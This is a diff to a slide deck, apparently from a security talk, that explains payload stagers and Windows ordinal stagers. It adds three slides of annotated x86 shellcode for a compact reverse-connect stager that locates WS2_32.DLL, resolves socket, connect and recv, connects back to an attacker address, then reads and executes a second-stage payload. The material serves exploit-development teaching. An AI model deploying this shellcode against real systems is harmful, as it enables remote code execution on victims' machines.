@@ -231,19 +231,168 @@
     \frametitle{What are payload stagers?}
 
     \begin{sitemize}
-        \item Typically small stubs that load and execute another payload
-        \item Useful in conditions where size is limited
-    \end{sitemize}
+        \item Payload stagers are small stubs that load and execute other
+        payloads
+        \item The payloads that are executed are known as stages
+        \item Stages perform arbitrary tasks, such as spawning a
+        shell
 
-    % TODO: diagram of a stager?
+        \pause
+        \item Stagers are typically network based and follow three
+        basic steps
+        \begin{sitemize}
+            \item Establish connection to attacker (reverse,
+            portbind, findsock)
+            \item Read in a payload from the connection
+            \item Execute a payload with the connection in known a register
+        \end{sitemize}
+
+        \pause
+        \item The three steps make it so stages are connection method
+        independent
+        \begin{sitemize}
+            \item No need to have command shell payloads for
+            reverse, portbind, and findsock
+        \end{sitemize}
+    \end{sitemize}
+\end{frame}
+
+\begin{frame}[t]
+    \frametitle{Why are payload stagers useful?}
+
+    \begin{sitemize}
+        \item Some vulnerabilities have limited space for the
+        initial payload
+        \item Typically much smaller than the stages
+        they execute
+        \item Eliminate the need to re-implement payloads for each
+        connection method
+    \end{sitemize}
 \end{frame}
 
 \section{Windows Ordinal Stagers}
 \begin{frame}[t]
-    \frametitle{Introduction}
+    \frametitle{Windows ordinal stagers}
+
+    \begin{sitemize}
+        \item Technique from Oded's lightning talk at core04
+        \item Uses static ordinals in \texttt{WS2\_32.DLL} to locate symbol
+        addresses
+        \item Compatible with all versions of Windows
+        \item Results in very low-overhead symbol resolution
+        \item Facilitates implementation of reverse, portbind, and
+        findsock stagers
+        \item Leads to very tiny win32 stagers (92 byte reverse, 93
+        byte findsock)
+        \item Technical write-up at
+        \footnotesize{\url{http://www.metasploit.com/users/spoonm/ordinals.txt}}
+    \end{sitemize}
 \end{frame}
+
 \begin{frame}[t]
-    \frametitle{Implementation: reverse stager}
+    \frametitle{Implementing a reverse ordinal stager}
+
+    \begin{sitemize}
+        \item Locate the base address of \texttt{WS2\_32.DLL}
+        \begin{sitemize}
+            \item Extract the Peb->Ldr pointer
+            \item Extract Flink from the InInitOrderModuleList
+            \item Loop through loaded modules comparing module names
+            \item Module name is stored in unicode, but can be
+            partially translated to ANSI in 5 bytes
+            \item Once \texttt{WS2\_32.DLL} is found, extract its
+            BaseAddress.
+        \end{sitemize}
+
+        \pause
+        \item Resolve \texttt{socket}, \texttt{connect},
+        and \texttt{recv}
+        \begin{sitemize}
+            \item Use static ordinals to index the address table
+        \end{sitemize}
+
+        \pause
+        \item Allocate a socket, connect to the attacker,
+        and read in the next payload
+
+        \pause
+        \item Requires that \texttt{WS2\_32.DLL} already be loaded
+        in the target process
+    \end{sitemize}
+
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Locating WS2\_32.DLL's base address}
+
+\footnotesize{
+    \begin{verbatim}
+FC         cld                   ; clear direction (lodsd)
+31DB       xor ebx,ebx           ; zero ebx
+648B4330   mov eax,[fs:ebx+0x30] ; eax = PEB
+8B400C     mov eax,[eax+0xc]     ; eax = PEB->Ldr
+8B501C     mov edx,[eax+0x1c]    ; edx = Ldr->InitList.Flink
+8B12       mov edx,[edx]         ; edx = LdrModule->Flink
+8B7220     mov esi,[edx+0x20]    ; esi = LdrModule->DllName
+AD         lodsd                 ; eax = [esi] ; esi += 4
+AD         lodsd                 ; eax = [esi] ; esi += 4
+4E         dec esi               ; esi--
+0306       add eax,[esi]         ; eax = eax + [esi]
+                                 ; (4byte unicode->ANSI)
+3D32335F32 cmp eax,0x325f3332    ; eax == 2_32?
+75EF       jnz 0xd               ; not equal, continue loop
+
+    \end{verbatim}
+}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Resolve symbols using static ordinals}
+
+\footnotesize{
+    \begin{verbatim}
+8B6A08     mov ebp,[edx+0x8]     ; ebp = LdrModule->BaseAddr
+8B453C     mov eax,[ebp+0x3c]    ; eax = DosHdr->e_lfanew
+8B4C0578   mov ecx,[ebp+eax+0x78]; ecx = Export Directory
+8B4C0D1C   mov ecx,[ebp+ecx+0x1c]; ecx = Address Table Rva
+01E9       add ecx,ebp           ; ecx += ws2base
+8B4158     mov eax,[ecx+0x58]    ; eax = socket rva
+01E8       add eax,ebp           ; eax += ws2base
+8B713C     mov esi,[ecx+0x3c]    ; eax = recv rva
+01EE       add esi,ebp           ; eax += ws2base
+03690C     add ebp,[ecx+0xc]     ; ebp += connect rva
+    \end{verbatim}
+}
+\end{frame}
+
+\begin{frame}[fragile]
+    \frametitle{Create the socket, connect back, recv, and jump}
+
+\footnotesize{
+    \begin{verbatim}
+; Use chained call-stacks to save space
+; connect returns to recv returns to buffer (fd in edi)
+53         push ebx              ; push 0
+6A01       push byte +0x1        ; push SOCK_STREAM
+6A02       push byte +0x2        ; push AF_INET
+FFD0       call eax              ; call socket
+97         xchg eax,edi          ; edi = fd
+687F000001 push dword 0x100007f  ; push sockaddr_in
+68020010E1 push dword 0xe1100002
+89E1       mov ecx,esp           ; ecx = &sockaddr_in
+53         push ebx              ; push flags (0)
+B70C       mov bh,0xc            ; ebx = 0x0c00
+53         push ebx              ; push length (0xc00)
+51         push ecx              ; push buffer
+57         push edi              ; push fd
+51         push ecx              ; push buffer
+6A10       push byte +0x10       ; push addrlen (16)
+51         push ecx              ; push &sockaddr_in
+57         push edi              ; push fd
+56         push esi              ; push recv
+FFE5       jmp ebp               ; call connect
+\end{verbatim}
+}
 \end{frame}
 
 \section{PassiveX}
